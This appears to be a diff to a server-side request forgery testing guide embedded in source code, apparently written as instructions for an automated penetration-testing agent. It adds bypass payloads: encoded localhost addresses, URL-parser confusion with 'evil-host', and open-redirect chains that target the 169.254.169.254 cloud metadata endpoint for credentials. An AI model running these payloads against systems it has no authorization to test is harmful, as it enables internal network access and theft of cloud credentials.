@@ -175,21 +175,23 @@ if echo "\$response" | grep -qi "redis"; then
 fi
 \`\`\`
 
-### Step 6: Bypass Techniques
+### Step 6: Bypassing Blacklist-Based Defenses (PortSwigger Best Practice)
 
-If basic payloads are blocked, try bypasses:
-
-#### IP Address Encoding
+**IP Address Encoding Variations:**
 \`\`\`bash
 # Different representations of 127.0.0.1
 ip_bypasses=(
   "http://2130706433"           # Decimal
   "http://0x7f000001"           # Hex
-  "http://0177.0.0.1"           # Octal
+  "http://0x7f.0x0.0x0.0x1"     # Hex with dots
+  "http://017700000001"         # Octal (full)
+  "http://0177.0.0.1"           # Octal (partial)
   "http://127.1"                # Shortened
-  "http://127.0.1"              # Shortened
+  "http://127.0.1"              # Shortened alternative
   "http://0"                    # Zero (often resolves to localhost)
-  "http://0.0.0.0"
+  "http://0.0.0.0"              # All interfaces
+  "http://[::1]"                # IPv6 localhost
+  "http://[0:0:0:0:0:0:0:1]"    # IPv6 full
 )
 for bypass in "\${ip_bypasses[@]}"; do
   response=\$(curl -s "\$TARGET?url=\$bypass")
@@ -199,29 +201,75 @@ for bypass in "\${ip_bypasses[@]}"; do
 done
 \`\`\`
 
-#### URL Encoding
+**URL Encoding Bypass:**
 \`\`\`bash
-# URL encoded localhost
 encoded_payloads=(
-  "http://%31%32%37%2e%30%2e%30%2e%31"   # URL encoded 127.0.0.1
-  "http://127.0.0.1%00.evil.com"          # Null byte
-  "http://evil.com@127.0.0.1"             # Basic auth confusion
-  "http://127.0.0.1#@evil.com"            # Fragment confusion
-  "http://127.0.0.1?@evil.com"            # Query confusion
+  "http://%31%32%37%2e%30%2e%30%2e%31"       # URL encoded 127.0.0.1
+  "http://%32%31%33%30%37%30%36%34%33%33"    # URL encoded decimal
+  "http://127.0.0.1%00.evil.com"              # Null byte termination
 )
 \`\`\`
 
-#### DNS Rebinding / Redirect
+**Custom Domain Resolution:**
 \`\`\`bash
-# Use a domain that resolves to internal IP
-# (Requires setting up DNS or using services like nip.io)
+# Register domain that resolves to internal IP
+# Or use services like nip.io, xip.io
 dns_payloads=(
   "http://127.0.0.1.nip.io"
-  "http://spoofed.burpcollaborator.net"   # If you control DNS
+  "http://localtest.me"         # Resolves to 127.0.0.1
+  "http://vcap.me"              # Resolves to 127.0.0.1
+  "http://your-domain-pointing-to-127.0.0.1"
 )
 \`\`\`
 
-### Step 7: Port Scanning via SSRF
+### Step 7: Bypassing Whitelist-Based Defenses (PortSwigger Best Practice)
+
+**Credential Injection:**
+\`\`\`bash
+# Embed target in URL credentials
+curl -s "\$TARGET?url=https://expected-host:fakepassword@evil-host"
+curl -s "\$TARGET?url=https://expected-host@evil-host"
+curl -s "\$TARGET?url=https://evil-host%23@expected-host"  # # encoded
+\`\`\`
+
+**Fragment Abuse:**
+\`\`\`bash
+# Use fragment to confuse parser
+curl -s "\$TARGET?url=https://evil-host#expected-host"
+curl -s "\$TARGET?url=https://evil-host%23expected-host"  # # encoded
+\`\`\`
+
+**DNS Hierarchy Exploitation:**
+\`\`\`bash
+# Create subdomain of allowed host
+curl -s "\$TARGET?url=https://expected-host.evil-host"
+curl -s "\$TARGET?url=https://expected-hostevil.com"
+\`\`\`
+
+**URL Parser Discrepancies:**
+\`\`\`bash
+# Different parsers interpret URLs differently
+curl -s "\$TARGET?url=https://expected-host%2f%2f@evil-host"
+curl -s "\$TARGET?url=https://expected-host%5c%5c@evil-host"  # backslashes
+curl -s "\$TARGET?url=https://expected-host%252f@evil-host"   # double encoded
+\`\`\`
+
+### Step 8: Open Redirection Chain Bypass
+
+**Exploit open redirect in allowed domain to reach internal targets:**
+
+\`\`\`bash
+# If allowed-domain.com has an open redirect:
+# allowed-domain.com/redirect?url=http://internal-target
+
+# Chain it through SSRF
+curl -s "\$TARGET?url=https://allowed-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/"
+
+# Common redirect parameters to look for
+redirect_params=("url" "redirect" "next" "dest" "return" "returnUrl" "redirect_uri" "continue" "target")
+\`\`\`
+
+### Step 9: Port Scanning via SSRF
 
 If SSRF is confirmed, use it to scan internal ports:
 
@@ -301,6 +349,23 @@ Signs that SSRF worked:
 - Response shows cloud instance metadata
 - Timing differences (internal vs external requests)
 
+## Evidence Validation Checkpoint
+
+**BEFORE documenting findings, verify you have AT LEAST ONE of:**
+- Internal service response content retrieved
+- Cloud metadata accessed (AWS/GCP/Azure instance data, credentials)
+- DNS callback to controlled server (with unique identifier)
+- Port scan results showing internal connectivity
+- Blacklist/whitelist bypass technique confirmed (IP encoding, URL parsing)
+- Open redirection chain exploited for internal access
+
+**NOT EVIDENCE (do not report these alone):**
+- Request made but no response analysis
+- Different error message (might just be blocking)
+- Timeout without confirmation
+- HTTP 200 without internal data
+- External URL fetch working (that's not SSRF unless you access internal resources)
+
 ## Success Criteria
 
 A valid SSRF finding must demonstrate:
@@ -312,11 +377,11 @@ A valid SSRF finding must demonstrate:
 
 ## Remember
 
+- **Test bypass techniques first** - IP encoding, URL parsing tricks, open redirects
+- **Cloud metadata is high-value** - 169.254.169.254 is your primary target
+- **Try multiple protocols** - file://, gopher://, dict:// may work when http:// is filtered
 - **POC = codification of your exploit** - document what you actually did
 - **Authenticate first** when testing authenticated endpoints
-- **Test multiple protocols** - file://, gopher://, dict:// may work when http:// is filtered
-- **Try bypass techniques** - IP encoding, URL encoding, DNS tricks
-- **Check for cloud metadata** - AWS/GCP/Azure metadata endpoints are high-value
 - **Document the CWE** - CWE-918 for SSRF
 - **Show actual impact** - accessing localhost is not enough; show what data was retrieved
 `;
